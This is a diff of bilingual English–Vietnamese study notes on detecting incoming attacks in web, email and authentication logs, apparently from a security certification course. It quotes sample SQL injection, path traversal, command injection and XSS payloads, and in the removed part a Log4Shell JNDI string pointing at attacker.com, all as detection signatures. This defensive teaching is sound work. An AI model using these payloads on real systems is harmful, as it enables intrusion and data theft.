@@ -1,76 +1,90 @@
-/* Theory — D9 (Appendix D). Edit the HTML below. */
-(window.CPIA_THEORY=window.CPIA_THEORY||{})["d9"]=`<h2>D9 — Incoming Attacks</h2><ul>
+/* Theory — D9 (Appendix D). 3-tier layout: Recall / Concept / Reference. */
+(window.CPIA_THEORY=window.CPIA_THEORY||{})["d9"]=`<h2>D9 — Incoming Attacks</h2>
 
-<li><span class="en">Public-facing attacks include exploitation of VPN, web apps, email gateways, RDP, SSH, SMB, and exposed admin portals.</span><span class="vi">Tấn công vào hệ thống đối ngoại bao gồm khai thác VPN, ứng dụng web, email gateway, RDP, SSH, SMB và cổng quản trị bị lộ.</span></li>
+<div class="tier recall" id="d9-recall">
+<div class="tier-h"><span class="tier-num">①</span><span class="en">Recall — must know</span><span class="vi">Recall — phải thuộc</span></div>
+<div class="tier-body"><ul>
+<li><strong>SQL injection:</strong> <span class="en">Log entries like id=1' OR '1'='1 in a query string.</span><span class="vi">Dòng log kiểu id=1' OR '1'='1 trong query string.</span></li>
+<li><strong>Path traversal:</strong> <span class="en">../../../../etc/passwd or ..%2f sequences in a request path.</span><span class="vi">Chuỗi ../../../../etc/passwd hoặc ..%2f trong đường dẫn yêu cầu.</span></li>
+<li><strong>Command injection:</strong> <span class="en">A request like /cgi-bin/test.sh;cat /etc/passwd.</span><span class="vi">Yêu cầu kiểu /cgi-bin/test.sh;cat /etc/passwd.</span></li>
+<li><strong>Scanner tooling:</strong> <span class="en">User-agents like "Nikto" or "sqlmap" = automated vuln-scanning/attack tooling.</span><span class="vi">User-agent kiểu "Nikto" hoặc "sqlmap" = công cụ quét lỗ hổng/tấn công tự động.</span></li>
+<li><strong>Brute force:</strong> <span class="en">Hundreds of HTTP 401/403 for one account from one IP in a minute.</span><span class="vi">Hàng trăm HTTP 401/403 cho một tài khoản từ một IP trong một phút.</span></li>
+<li><strong>Successful compromise sign:</strong> <span class="en">After scanning, a single successful POST creating shell.aspx = likely web-shell upload.</span><span class="vi">Sau khi quét, một POST thành công tạo shell.aspx = khả năng upload web-shell.</span></li>
+<li><strong>Detection coverage:</strong> <span class="en">For public-facing web and email services, combine rate/statistical anomalies, attack signatures and manual review of traffic and logs to prove success—not merely an attempt.</span><span class="vi">Với dịch vụ web và email public-facing, kết hợp bất thường thống kê/tần suất, chữ ký tấn công và rà tay traffic/log để chứng minh thành công—không chỉ là một lần thử.</span></li>
+</ul></div></div>
 
-<li><span class="en">Evidence: WAF / web logs, IDS signatures, firewall permits, auth failures / successes, uploaded files, new processes after request.</span><span class="vi">Bằng chứng: log WAF / web, chữ ký IDS, lệnh cho phép tường lửa, lỗi / thành công xác thực, file được tải lên, tiến trình mới sau request.</span></li>
+<details class="tier concept" id="d9-concept">
+<summary><span class="tier-num">②</span><span class="en">Concept — understand deeply</span><span class="vi">Concept — hiểu sâu</span></summary>
+<div class="tier-body">
+<h4>Đọc web-log tìm tấn công</h4>
+<p>Nhận ra <strong>chữ ký tấn công</strong> trong access log: <strong>SQLi</strong> (<code>' OR '1'='1</code>, UNION SELECT), <strong>path traversal</strong> (<code>../</code>, <code>..%2f</code>, <code>/etc/passwd</code>), <strong>XSS</strong> (<code>&lt;script&gt;</code>, <code>%3Cscript%3E</code>), <strong>command injection</strong> (<code>;</code>, <code>|</code>, <code>&#96;</code> + lệnh), và <strong>scanner user-agent</strong> (Nikto/sqlmap). Mã trạng thái/kích thước phản hồi giúp đoán thành/bại.</p>
 
-<li><span class="en">Successful attack signs: HTTP 200 after exploit payload, webshell writes, new account, service start, reverse shell, privilege escalation events.</span><span class="vi">Dấu hiệu tấn công thành công: HTTP 200 sau payload exploit, ghi webshell, tài khoản mới, khởi động dịch vụ, reverse shell, sự kiện leo thang đặc quyền.</span></li>
+<h4>Phân biệt "có" vs "thành công"</h4>
+<p>Quan trọng: D9 hỏi phát hiện tấn công <strong>thành công</strong>. Nhiều 401/403 = brute-force đang thử (chưa chắc thành công); một <strong>200/302 + tạo file lạ</strong> (vd shell.aspx trong webroot) hoặc đổi byte phản hồi lớn bất thường = dấu hiệu <em>đã chiếm được</em>. Theo dõi chuỗi: scan → thử khai thác → một request thành công → hoạt động sau khai thác.</p>
 
+<h4>Email-based incoming</h4>
+<p>Tấn công đến qua email: phishing (xem header, link, đính kèm), khai thác mail server. Đối chiếu mail logs + gateway AV + endpoint để xác nhận thành công.</p>
+</div></details>
+
+<details class="tier reference" id="d9-reference">
+<summary><span class="tier-num">③</span><span class="en">Reference — lookup tables</span><span class="vi">Reference — bảng tra cứu</span></summary>
+<div class="tier-body">
+<h4>Web-attack signatures</h4>
+<div class="table-wrap"><table>
+<tr><th>Pattern</th><th>Attack</th></tr>
+<tr><td>' OR '1'='1 , UNION SELECT</td><td>SQL injection</td></tr>
+<tr><td>../ , ..%2f , /etc/passwd</td><td>Path traversal</td></tr>
+<tr><td>&lt;script&gt; , %3Cscript%3E</td><td>XSS</td></tr>
+<tr><td>; cat /etc/passwd , | , backtick</td><td>OS command injection</td></tr>
+<tr><td>User-agent Nikto/sqlmap</td><td>Automated scanner/attack tool</td></tr>
+</table></div>
+
+<h4>Brute-force vs compromise</h4>
+<div class="table-wrap"><table>
+<tr><th>Sign</th><th>Meaning</th></tr>
+<tr><td>Many 401/403, one account, one IP</td><td>Brute-force attempt</td></tr>
+<tr><td>Sudden 200 after failures</td><td>Possible successful login</td></tr>
+<tr><td>POST creating shell.aspx/.php</td><td>Web-shell upload (compromise)</td></tr>
+</table></div>
+</div></details>
+
+<details class="tier deep-dive" id="d9-deep-dive">
+<summary>
+<span class="tier-num">④</span>Deep Dive — thực hành, diễn giải &amp; giới hạn</summary>
+<div class="tier-body">
+<div class="deep-grid">
+<div class="deep-card">
+<h4>Quy trình phân tích</h4>
+<ol>
+<li>Tạo chain recon→exploit attempt→success indicator→post-exploitation.</li>
+<li>Đọc request đã decode cùng status, bytes, latency, backend/endpoint events.</li>
+<li>Với email, theo Message-ID từ gateway→mailbox→click/process.</li>
+</ol>
+</div>
+<div class="deep-card">
+<h4>Artefact / dữ liệu cần đọc</h4>
+<ul>
+<li>SQLi/traversal/XSS/command pattern, 200/302 change, file creation, child shell.</li>
+<li>SMTP/gateway verdict, attachment hash, URL click, EDR process/network.</li>
 </ul>
-
-<p class="sub-heading">Common Exploit Patterns and Evidence</p>
-
-<p><strong>SQL Injection</strong></p><ul><li><strong>Evidence:</strong> web logs show single-quote, UNION SELECT, OR 1=1, comment sequences (--, #, /*) in query parameters.</li><li><strong>Detection:</strong> WAF signatures, repeated 500 errors after specific input patterns, abnormal database query logs.</li></ul>
-
-<p class="sub-heading">Webshell deployment</p><ul><li><strong>Evidence:</strong> new file created in webroot (e.g., cmd.php, error_log.asp), unusual file size, suspicious content (eval, exec, system calls).</li><li><strong>Detection:</strong> file integrity monitoring, web server logs showing POST to an unusual file, AV / EDR alerts.</li></ul>
-
-<p class="sub-heading">Command injection</p><ul><li><strong>Evidence:</strong> shell metacharacters (;, |, &amp;&amp;, backticks, $()) in HTTP parameters.</li><li><strong>Detection:</strong> WAF rules, process creation logs showing spawned shell (cmd.exe, /bin/sh) as child of web server process.</li></ul>
-
-<p class="sub-heading">Path traversal</p><ul><li><strong>Evidence:</strong> ../, ..\\, URL-encoded variations (%2e%2e%2f) in request URIs.</li><li><strong>Detection:</strong> WAF rules, web server error logs showing access to unexpected file paths.</li></ul>
-
-<p class="sub-heading">RDP brute force</p><ul><li><strong>Evidence:</strong> high volume of failed logons (Event 4625, logon type 10) from an external IP, followed by a successful logon (4624 type 10).</li><li><strong>Detection:</strong> Windows Event Log correlation, SIEM threshold rule on 4625 events.</li></ul>
-
-<p class="sub-heading">Credential stuffing against VPN</p><ul><li><strong>Evidence:</strong> multiple failed VPN authentication attempts from various source IPs using known breached credentials.</li><li><strong>Detection:</strong> VPN logs, account lockout events (4740), geolocation anomalies.</li></ul>
-
-<p class="sub-heading">Log4Shell (CVE-2021-44228)</p><ul>
-
-<li><strong>What:</strong> JNDI injection vulnerability in Apache Log4j 2. Attacker sends crafted string (e.g., <code>\${jndi:ldap://attacker.com / a}</code>) which Log4j evaluates, causing the vulnerable server to fetch and execute a remote payload.</li>
-
-<li><strong>Evidence:</strong> web logs containing <code>\${jndi:</code> in headers (User-Agent, X-Forwarded-For, Referer) or request parameters; outbound LDAP / RMI connections from web server to external IPs; new Java processes spawned after web request.</li>
-
-<li><strong>Detection:</strong> WAF rules for <code>\${jndi:</code> pattern (including obfuscated variants like <code>\${\${lower:j}ndi:</code>); IDS signatures for JNDI injection; endpoint process monitoring for java.exe spawning shell commands.</li>
-
-<li><strong>Scope:</strong> Affects any application using Log4j 2.x — many enterprise Java applications, cloud services, and appliances were vulnerable.</li>
-
-<li><strong>Follow-up CVEs:</strong> CVE-2021-45046 (incomplete fix in 2.15.0 — still vulnerable in certain configurations) and CVE-2021-45105 (DoS via recursive lookup). Upgrade to Log4j 2.17.0+ for complete fix.</li>
-
+</div>
+</div>
+<h4>Lệnh, bộ lọc hoặc thao tác hữu ích</h4>
+<ul>
+<li>
+<span class="cmd-safety cmd-ro">READ-ONLY/OFFLINE</span>Decode percent/Unicode một lần có kiểm soát; giữ raw request.</li>
+<li>
+<span class="cmd-safety cmd-ro">READ-ONLY/OFFLINE</span>Correlate WAF/web/app/OS logs theo request/correlation ID.</li>
 </ul>
-
-<p class="sub-heading">ProxyLogon / ProxyShell (Exchange exploits)</p><ul>
-
-<li><strong>ProxyLogon (CVE-2021-26855 + CVE-2021-27065):</strong> SSRF vulnerability in Exchange allowing unauthenticated access to admin endpoints; combined with arbitrary file write to deploy webshells.</li>
-
-<li><strong>ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207):</strong> Pre-auth SSRF → privilege escalation → arbitrary file write; exploited via Exchange Client Access Service (CAS) on port 443.</li>
-
-<li><strong>Evidence:</strong> webshell files written to Exchange directories (e.g., <code>C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\</code>); IIS logs showing exploitation URIs (<code>/owa/auth/x.js</code>, <code>/ecp/y.js</code>); new scheduled tasks or services; LSASS access by Exchange worker processes.</li>
-
-<li><strong>Detection:</strong> Microsoft Exchange CU patches; IOC scanning tools from Microsoft; IIS log analysis for known exploitation patterns; file integrity monitoring on Exchange directories.</li>
-
-<li><strong>Post-exploitation:</strong> Attackers commonly deploy China Chopper, ASPXSpy, or other webshells; dump credentials from Exchange; move laterally to DC.</li>
-
+<h4>Tình huống diễn giải</h4>
+<p>HTTP 200 không tự chứng minh SQLi thành công; response content, DB error/query và dữ liệu trả về mới xác nhận.</p>
+<h4>Bẫy, ngoại lệ &amp; kiểm chứng</h4>
+<ul>
+<li>Scanner tạo nhiều signature nhưng không compromise.</li>
+<li>WAF block log có thể là true attack nhưng successful defense.</li>
+<li>Email Delivered không đồng nghĩa user executed payload.</li>
 </ul>
-
-<p class="sub-heading"><span class="en">Web Shell Access Patterns and Authentication Failures</span><span class="vi">Mẫu truy cập Web Shell và lỗi xác thực</span></p><ul><li><strong>Web shell in logs:</strong> <span class="en">POST request to static-looking file (.php / .aspx in /images/ or /upload/) followed by large response body. Command: <code>grep "POST.*200" access.log</code> filter by high response bytes.</span><span class="vi">Request POST đến file trông như tĩnh (.php / .aspx trong /images/ hoặc /upload/) theo sau bởi response body lớn. Lệnh: <code>grep "POST.*200" access.log</code> lọc theo bytes phản hồi cao.</span></li><li><strong>RCE confirmation:</strong> <span class="en">Web server process (w3wp.exe, httpd, nginx) spawning cmd.exe, bash, or powershell — Event 4688 parent-child pattern.</span><span class="vi">Tiến trình web server (w3wp.exe, httpd, nginx) tạo cmd.exe, bash hoặc powershell — mẫu cha-con Event 4688.</span></li><li><strong><span class="en">Email authentication failures = phishing:</span><span class="vi">Lỗi xác thực email = phishing:</span></strong> <span class="en">SPF FAIL = sending IP not in domain SPF record. DKIM FAIL = message modified or key mismatch. DMARC FAIL = neither SPF nor DKIM aligned → likely spoofed sender.</span><span class="vi">SPF FAIL = IP gửi không có trong bản ghi SPF của domain. DKIM FAIL = tin nhắn bị sửa đổi hoặc khóa không khớp. DMARC FAIL = cả SPF và DKIM đều không phù hợp → khả năng cao người gửi bị giả mạo.</span></li><li><strong>BEC indicators:</strong> <span class="en">Display name spoofing, lookalike domain (micros0ft.com), unusual sending time, financial urgency, changed reply-to address.</span><span class="vi">Giả mạo tên hiển thị, domain tương tự (micros0ft.com), thời gian gửi bất thường, tính cấp bách tài chính, địa chỉ reply-to bị thay đổi.</span></li></ul>
-
-<p class="sub-heading"><span class="en">Web Application Attack Evidence</span><span class="vi">Bằng chứng tấn công ứng dụng web</span></p>
-
-<p class="sub-heading"><span class="en">SQL Injection in Web Logs</span><span class="vi">SQL Injection trong web log</span></p><ul><li>Normal: <code>GET /products?id=42 HTTP/1.1</code></li><li>Malicious: <code>GET /products?id=42' UNION SELECT username, password FROM users-- HTTP/1.1</code></li><li><span class="en">Detection: WAF logs, repeated 500 errors, unusual parameter length, SQL keywords in query strings.</span><span class="vi">Phát hiện: log WAF, lỗi 500 lặp lại, độ dài tham số bất thường, từ khóa SQL trong query string.</span></li></ul>
-
-<p class="sub-heading"><span class="en">Cross-Site Scripting (XSS)</span><span class="vi">Tấn công XSS (Cross-Site Scripting)</span></p><ul><li><strong>Reflected:</strong> <code>GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</code></li><li><strong>Stored:</strong> <span class="en">POST to comment field, then GET renders payload for other users.</span><span class="vi">POST vào trường bình luận, sau đó GET hiển thị payload cho người dùng khác.</span></li><li><span class="en">Detection: script tags in parameters, event handlers (<code>onerror</code>, <code>onload</code>), encoded variants.</span><span class="vi">Phát hiện: thẻ script trong tham số, event handler (<code>onerror</code>, <code>onload</code>), các biến thể mã hóa.</span></li></ul>
-
-<p class="sub-heading">SSRF</p><ul><li><strong>Evidence:</strong> <span class="en">Internal request to cloud metadata endpoint (<code>169.254.169.254</code>), internal IP ranges, localhost.</span><span class="vi">Request nội bộ đến endpoint metadata cloud (<code>169.254.169.254</code>), dải IP nội bộ, localhost.</span></li><li><span class="en">Detection: outbound connections from web server to unexpected internal destinations.</span><span class="vi">Phát hiện: kết nối ra ngoài từ web server đến đích nội bộ không mong đợi.</span></li></ul>
-
-<p class="sub-heading"><span class="en">Deserialisation</span><span class="vi">Tấn công Deserialisation</span></p><ul><li><strong>Evidence:</strong> <span class="en">Serialised objects in request body (Java: <code>rO0AB...</code>, PHP: <code>O:...</code>, .NET: <code>AAEAAAD...</code>).</span><span class="vi">Đối tượng được serialize trong body request (Java: <code>rO0AB...</code>, PHP: <code>O:...</code>, .NET: <code>AAEAAAD...</code>).</span></li><li><span class="en">Detection: unusual content types, known gadget chain patterns, new processes spawned by web server.</span><span class="vi">Phát hiện: content type bất thường, mẫu gadget chain đã biết, tiến trình mới được tạo bởi web server.</span></li></ul>
-
-
-<h3 class="qz-theory"><span class="en">Detecting Incoming Attacks in Logs</span><span class="vi">Phát hiện tấn công đến trong log</span></h3>
-<div class="table-wrap"><table><thead><tr><th><span class="en">Log pattern</span><span class="vi">Mẫu trong log</span></th><th><span class="en">Attack</span><span class="vi">Tấn công</span></th></tr></thead><tbody>
-<tr><td><code>id=1' OR '1'='1</code>, <code>UNION SELECT</code>, <code>--</code></td><td>SQL injection</td></tr>
-<tr><td><code>../../../etc/passwd</code>, <code>..%2f..%2f</code></td><td><span class="en">Directory/path traversal</span><span class="vi">Vượt thư mục</span></td></tr>
-<tr><td><span class="en">Shell metachars <code>; | &amp;&amp; \`</code> + commands</span><span class="vi">Ký tự shell <code>; | &amp;&amp; \`</code> + lệnh</span></td><td><span class="en">OS command injection</span><span class="vi">Tiêm lệnh OS</span></td></tr>
-<tr><td><span class="en">Burst of 401/403 for one account</span><span class="vi">Loạt 401/403 cho một tài khoản</span></td><td><span class="en">Brute force / credential stuffing</span><span class="vi">Brute force / credential stuffing</span></td></tr>
-<tr><td><span class="en">POST creating a new <code>.aspx</code>/<code>.php</code></span><span class="vi">POST tạo <code>.aspx</code>/<code>.php</code> mới</span></td><td><span class="en">Web shell upload</span><span class="vi">Upload web shell</span></td></tr>
-<tr><td><span class="en">User-agent "Nikto"/"sqlmap"</span><span class="vi">User-agent "Nikto"/"sqlmap"</span></td><td><span class="en">Automated scanning</span><span class="vi">Quét tự động</span></td></tr></tbody></table></div>
-<p><span class="en">Check the response code/size and any follow-up (e.g. 200 after a 401, data returned, a new server-executable file) to judge whether the attack succeeded.</span><span class="vi">Kiểm tra mã/kích thước phản hồi và dấu hiệu tiếp theo (vd 200 sau một 401, dữ liệu trả về, file thực thi server mới) để đánh giá tấn công có thành công không.</span></p>
-`;
+<p class="deep-ref">
+<strong>Nguồn nên đọc tiếp:</strong> OWASP Testing Guide; MITRE Initial Access; web/mail vendor logs.</p>
+</div>
+</details>`;
